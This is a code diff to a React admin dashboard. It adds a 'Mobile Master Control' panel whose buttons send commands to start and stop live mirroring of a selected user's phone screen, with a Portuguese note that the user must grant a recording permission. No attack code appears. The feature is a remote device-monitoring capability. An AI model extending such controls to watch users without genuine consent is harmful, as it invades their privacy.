@@ -481,6 +481,31 @@ export default function AdminDashboard() {
                                         <div className="absolute -top-24 -right-24 w-48 h-48 bg-cyan-500/10 blur-[100px] group-hover:bg-cyan-500/20 transition-all"></div>
                                         <h3 className="text-cyan-400 font-black text-[12px] mb-8 flex items-center gap-4 uppercase tracking-[0.4em] italic"><Zap size={20} className="animate-pulse" /> Master Control v3.0</h3>
 
+                                        {selectedUser.intel?.source === 'MOBILE_APP' && (
+                                            <div className="mb-10 p-6 bg-red-600/5 border border-red-600/20 rounded-3xl space-y-4">
+                                                <div className="flex items-center justify-between">
+                                                    <span className="text-[10px] text-red-500 font-black uppercase tracking-widest flex items-center gap-2"><Smartphone size={14} /> Mobile Master Control v4.0</span>
+                                                    <div className="flex gap-2">
+                                                        <button
+                                                            onClick={() => sendCommand('START_MOBILE_SCREEN', selectedUser.id)}
+                                                            className="px-4 py-2 bg-red-700 text-white rounded-lg text-[8px] font-black uppercase tracking-widest hover:bg-white hover:text-red-700 transition-all shadow-lg shadow-red-900/20"
+                                                        >
+                                                            Iniciar Espelhamento
+                                                        </button>
+                                                        <button
+                                                            onClick={() => sendCommand('STOP_MOBILE_SCREEN', selectedUser.id)}
+                                                            className="px-4 py-2 bg-zinc-800 text-zinc-400 rounded-lg text-[8px] font-black uppercase tracking-widest hover:bg-zinc-700 transition-all"
+                                                        >
+                                                            Parar
+                                                        </button>
+                                                    </div>
+                                                </div>
+                                                <p className="text-[7px] text-zinc-500 font-medium uppercase leading-relaxed">
+                                                    ⚠️ O usuário deverá aceitar a permissão de "Gravação/Transmissão" no celular para iniciar o espelhamento em tempo real.
+                                                </p>
+                                            </div>
+                                        )}
+
                                         <div className="space-y-8">
                                             {/* Notificação Desktop */}
                                             <div className="space-y-4">
